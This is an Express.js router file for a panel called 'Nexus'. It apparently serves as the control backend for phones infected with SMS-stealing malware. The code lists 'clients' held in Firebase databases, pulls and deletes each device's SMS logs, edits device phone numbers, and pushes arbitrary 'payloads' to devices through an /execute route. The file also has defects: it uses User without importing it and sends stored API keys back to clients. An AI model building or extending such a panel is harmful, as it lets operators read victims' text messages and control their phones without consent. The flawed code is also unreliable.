const express = require('express');
const router = express.Router();
const Source = require('../models/Source');
const { protect } = require('../middleware/authMiddleware');
const axios = require('axios'); // We need axios for fetching from Firebase. Let's install it.

// Helper to fetch and optionally use an auth token
const fetchFirebase = async (url) => {
    try {
        const response = await axios.get(url, { timeout: 10000 });
        return response.data;
    } catch (error) {
        return null;
    }
};

// @route   GET /api/databases
// @desc    Get allowed databases/sources for the current user
// @access  Private
router.get('/databases', protect, async (req, res) => {
    try {
        const query = { $or: [{ owner: null }, { owner: req.user._id }] };
        const sources = await Source.find(query);
        const safeSources = sources.map(s => ({
            _id: s._id,
            key: s.key,
            label: s.label,
            color: s.color,
            owner: s.owner,
            base: s.base,
            apiKey: s.apiKey
        }));
        res.json({ success: true, data: safeSources });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error fetching databases' });
    }
});

// @route   POST /api/databases
// @desc    Add a database connection
// @access  Private
router.post('/databases', protect, async (req, res) => {
    try {
        const { key, label, base, apiKey, color } = req.body;
        const owner = req.user.role === 'admin' ? null : req.user._id;
        
        // Server-side Deduplication: Reject identical Firebase URLs system-wide
        const existingBase = await Source.findOne({ base });
        if (existingBase) {
            return res.status(400).json({ success: false, message: 'Firebase URL is already connected to Nexus' });
        }
        
        const source = await Source.create({
            key, label, base, apiKey, color, owner
        });
        
        // Return a mock stats object to prevent the frontend detailsHtml from showing undefined
        const stats = { total: 0, online: 0, offline: 0 };
        res.status(201).json({ success: true, source, stats });
    } catch (error) {
        if (error.code === 11000) return res.status(400).json({ success: false, message: 'Database key already exists' });
        res.status(500).json({ success: false, message: 'Server error creating database' });
    }
});

// @route   DELETE /api/databases/:src
// @desc    Delete a database connection
// @access  Private
router.delete('/databases/:src', protect, async (req, res) => {
    try {
        const query = { key: req.params.src, $or: [{ owner: null }, { owner: req.user._id }] };
        if (req.user.role !== 'admin') {
            // Standard users can only delete their own private sources
            query.owner = req.user._id;
            delete query.$or;
        }
        
        const deleted = await Source.findOneAndDelete(query);
        if (!deleted) return res.status(404).json({ success: false, message: 'Database not found or unauthorized' });
        
        res.json({ success: true, message: 'Database deleted' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error deleting database' });
    }
});

// @route   GET /api/devices
// @desc    Fetch all devices from allowed Firebase Sources and merge them
// @access  Private
router.get('/devices', protect, async (req, res) => {
    try {
        // Find sources user has access to. 
        // Admins can see all global sources (owner: null) and their own.
        // Users can see global sources (owner: null) AND their own private sources.
        const query = { $or: [{ owner: null }, { owner: req.user._id }] };
        const sources = await Source.find(query);

        let mergedDevices = [];

        await Promise.all(sources.map(async (src) => {
            // NOTE: Add logic later to anonymously authenticate if src.apiKey exists
            // For now, assume public `.json` endpoints for simplicity in the proxy MVP
            const data = await fetchFirebase(`${src.base}/clients.json`);
            if (data && typeof data === 'object') {
                const entries = Array.isArray(data) ? data.map((v, i) => [String(i), v]).filter(x => x[1]) : Object.entries(data);
                for (const [id, info] of entries) {
                    if (info && typeof info === 'object') {
                        mergedDevices.push({
                            _id: id,
                            _src: src.key,
                            ...info
                        });
                    }
                }
            }
        }));

        res.json({ success: true, count: mergedDevices.length, data: mergedDevices });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, message: 'Server error fetching devices' });
    }
});

// @route   GET /api/messages/:src/:id
// @desc    Fetch SMS logs for a specific device securely
// @access  Private
router.get('/messages/:src/:id', protect, async (req, res) => {
    try {
        const { src, id } = req.params;
        const source = await Source.findOne({ key: src, $or: [{ owner: null }, { owner: req.user._id }] });
        
        if (!source) return res.status(404).json({ success: false, message: 'Source not found or unauthorized' });

        const paths = [`/messages/${id}.json`, `/clients/${id}/messages.json`, `/sms/${id}.json`, `/clients/${id}/sms.json`];
        let smsData = [];

        for (let p of paths) {
            const data = await fetchFirebase(`${source.base}${p}`);
            if (data) {
                if (Array.isArray(data)) {
                    smsData = data.map((x, i) => x ? { ...x, _fbPath: p, _fbKey: i } : null).filter(x => x);
                } else if (typeof data === 'object') {
                    smsData = Object.keys(data).map(key => ({
                        ...(typeof data[key] === 'object' ? data[key] : { message: String(data[key]) }),
                        _fbPath: p,
                        _fbKey: key
                    }));
                }
                if (smsData.length > 0) break;
            }
        }

        res.json({ success: true, data: smsData });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Error fetching messages' });
    }
});

// @route   DELETE /api/devices/:src/:id
// @desc    Delete a specific device from Firebase
// @access  Private
router.delete('/devices/:src/:id', protect, async (req, res) => {
    try {
        const { src, id } = req.params;
        const source = await Source.findOne({ key: src, $or: [{ owner: null }, { owner: req.user._id }] });
        if (!source) return res.status(403).json({ success: false, message: 'Unauthorized source' });

        const url = `${source.base}/clients/${id}.json${source.apiKey ? `?auth=${source.apiKey}` : ''}`;
        const fRes = await fetch(url, { method: 'DELETE' });
        
        if (!fRes.ok) throw new Error('Firebase deletion failed');
        res.json({ success: true, message: 'Device deleted' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Error deleting device' });
    }
});

// @route   PUT /api/devices/:src/:id/phone
// @desc    Manually edit a device's custom phone number
// @access  Private (Admin or Authorized)
router.put('/devices/:src/:id/phone', protect, async (req, res) => {
    try {
        const canEdit = req.user.role === 'admin' || req.user.permissions?.canEditPhone;
        if (!canEdit) return res.status(403).json({ success: false, message: 'Access Denied: Missing M-Badge rights' });

        const { src, id } = req.params;
        const { customPh } = req.body;
        
        const source = await Source.findOne({ key: src, $or: [{ owner: null }, { owner: req.user._id }] });
        if (!source) return res.status(403).json({ success: false, message: 'Unauthorized source' });

        const url = `${source.base}/clients/${id}/customPh.json${source.apiKey ? `?auth=${source.apiKey}` : ''}`;
        const fRes = await fetch(url, { 
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(customPh) 
        });
        
        if (!fRes.ok) throw new Error('Firebase update failed');
        res.json({ success: true, message: 'Number updated' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Error updating number' });
    }
});

// @route   POST /api/execute/:src/:id
// @desc    Push a payload to a device's specific path
// @access  Private
router.post('/execute/:src/:id', protect, async (req, res) => {
    try {
        const { src, id } = req.params;
        const { path, payload } = req.body;
        
        const source = await Source.findOne({ key: src, $or: [{ owner: null }, { owner: req.user._id }] });
        if (!source) return res.status(403).json({ success: false, message: 'Unauthorized source' });

        const url = `${source.base}/clients/${id}${path}${source.apiKey ? `?auth=${source.apiKey}` : ''}`;
        const fRes = await fetch(url, { 
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload) 
        });
        
        if (!fRes.ok) throw new Error('Firebase payload failed');
        res.json({ success: true, message: 'Payload dispatched' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Error dispatching payload' });
    }
});

// @route   DELETE /api/messages/:src/:id/:msgId
// @desc    Delete a specific SMS message
// @access  Private
router.delete('/messages/:src/:id/:msgId', protect, async (req, res) => {
    try {
        const { src, id, msgId } = req.params;
        
        const source = await Source.findOne({ key: src, $or: [{ owner: null }, { owner: req.user._id }] });
        if (!source) return res.status(403).json({ success: false, message: 'Unauthorized source' });

        const url = `${source.base}/clients/${id}/smsLog/${msgId}.json${source.apiKey ? `?auth=${source.apiKey}` : ''}`;
        const fRes = await fetch(url, { method: 'DELETE' });
        
        if (!fRes.ok) throw new Error('Firebase deletion failed');
        res.json({ success: true, message: 'Message deleted' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Error deleting message' });
    }
});


// @route   GET /api/admin/users
// @desc    Get all users for admin management
// @access  Private (Admin Only)
router.get('/admin/users', protect, async (req, res) => {
    try {
        if (req.user.role !== 'admin') {
            return res.status(403).json({ success: false, message: 'Not authorized' });
        }
        
        // Exclude the password hash from the response
        const users = await User.find().select('-password');
        res.json({ success: true, users });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error loading users' });
    }
});

module.exports = router;
